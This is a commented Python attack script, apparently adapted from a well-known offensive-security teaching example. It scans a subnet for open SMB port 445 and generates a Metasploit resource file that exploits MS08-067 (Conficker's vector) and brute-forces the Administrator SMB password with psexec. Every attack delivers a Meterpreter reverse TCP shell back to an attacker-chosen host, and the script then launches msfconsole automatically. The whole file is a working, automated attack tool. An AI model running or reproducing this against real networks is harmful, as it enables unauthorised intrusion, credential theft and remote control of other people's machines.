# Import necessary modules
import optparse  # For command-line option parsing
import sys       # For system-related functions
import os        # For operating system interactions like running system commands
import nmap      # For using nmap to scan the network for open ports

# Function to find target hosts with SMB port (445) open
def findTgts(subNet):
    nmScan = nmap.PortScanner()  # Initialize nmap scanner
    nmScan.scan(subNet, '445')   # Scan the given subnet for port 445 (SMB)
    tgtHosts = []                # List to store target hosts
    for host in nmScan.all_hosts():
        if nmScan[host].has_tcp(445):  # Check if the host has TCP port 445 open
            state = nmScan[host]['tcp'][445]['state']  # Get the state of port 445
            if state == 'open':  # If the port is open, add the host to the target list
                print('[+] Found Target Host: ' + host)
                tgtHosts.append(host)
    return tgtHosts  # Return the list of target hosts

# Function to setup a Metasploit handler for reverse shell
def setupHandler(configFile, lhost, lport):
    configFile.write('use exploit/multi/handler\n')  # Use multi-handler
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')  # Set payload for reverse TCP
    configFile.write('set LPORT ' + str(lport) + '\n')  # Set local port for reverse connection
    configFile.write('set LHOST ' + lhost + '\n')  # Set local host for reverse connection
    configFile.write('exploit -j -z\n')  # Run the exploit in the background (-j) and don't wait (-z)
    configFile.write('setg DisablePayloadHandler 1\n')  # Disable automatic payload handling after the first one

# Function to exploit the MS08-067 vulnerability (Conficker's vector)
def confickerExploit(configFile, tgtHost, lhost, lport):
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')  # Use MS08-067 NetAPI exploit
    configFile.write('set RHOST ' + str(tgtHost) + '\n')  # Set the remote target host
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')  # Set payload for reverse TCP
    configFile.write('set LPORT ' + str(lport) + '\n')  # Set local port for reverse connection
    configFile.write('set LHOST ' + lhost + '\n')  # Set local host for reverse connection
    configFile.write('exploit -j -z\n')  # Run the exploit in the background

# Function to brute-force SMB login credentials using the PsExec module
def smbBrute(configFile, tgtHost, passwdFile, lhost, lport):
    username = 'Administrator'  # SMB user is typically 'Administrator'
    pF = open(passwdFile, 'r')  # Open the password file for reading
    for password in pF.readlines():  # Iterate over each password in the file
        password = password.strip('\n').strip('\r')  # Clean up the password
        configFile.write('use exploit/windows/smb/psexec\n')  # Use PsExec exploit for SMB
        configFile.write('set SMBUser ' + str(username) + '\n')  # Set SMB username
        configFile.write('set SMBPass ' + str(password) + '\n')  # Set SMB password from the password file
        configFile.write('set RHOST ' + str(tgtHost) + '\n')  # Set the target host
        configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')  # Set payload for reverse TCP
        configFile.write('set LPORT ' + str(lport) + '\n')  # Set local port for reverse connection
        configFile.write('set LHOST ' + lhost + '\n')  # Set local host for reverse connection
        configFile.write('exploit -j -z\n')  # Run the exploit in the background
    pF.close()  # Close the password file

# Main function to handle command-line options and execute the exploit
def main():
    # Open a configuration file to write Metasploit commands
    configFile = open('meta.rc', 'w')
    
    # Define command-line options using optparse
    parser = optparse.OptionParser('[-] Usage: %prog -H <RHOST[s]> -l <LHOST> [-p <LPORT> -F <Password File>]')
    
    # Option to specify the target host(s)
    parser.add_option('-H', dest='tgtHost', type='string', help='specify the target address[es]')
    
    # Option to specify the local port for the reverse connection
    parser.add_option('-p', dest='lport', type='string', help='specify the listen port')
    
    # Option to specify the local host for the reverse connection
    parser.add_option('-l', dest='lhost', type='string', help='specify the listen address')
    
    # Option to specify a password file for SMB brute force
    parser.add_option('-F', dest='passwdFile', type='string', help='specify password file for SMB brute force')
    
    # Parse the options from the command-line arguments
    (options, args) = parser.parse_args()
    
    # If target host or local host is not provided, print usage and exit
    if (options.tgtHost == None) or (options.lhost == None):
        print(parser.usage)
        exit(0)
    
    # Set variables from parsed options
    lhost = options.lhost
    lport = options.lport if options.lport else '1337'  # Default to port 1337 if not provided
    passwdFile = options.passwdFile  # Password file for brute-force attack
    
    # Find target hosts with open port 445 (SMB)
    tgtHosts = findTgts(options.tgtHost)
    
    # Setup a Metasploit handler for reverse shell
    setupHandler(configFile, lhost, lport)
    
    # Exploit each target host found
    for tgtHost in tgtHosts:
        confickerExploit(configFile, tgtHost, lhost, lport)  # Use Conficker exploit
        
        # If a password file is provided, perform SMB brute force
        if passwdFile:
            smbBrute(configFile, tgtHost, passwdFile, lhost, lport)
    
    # Close the configuration file
    configFile.close()
    
    # Run msfconsole with the generated config file
    os.system('msfconsole -r meta.rc')

# Entry point of the script
if __name__ == '__main__':
    main()
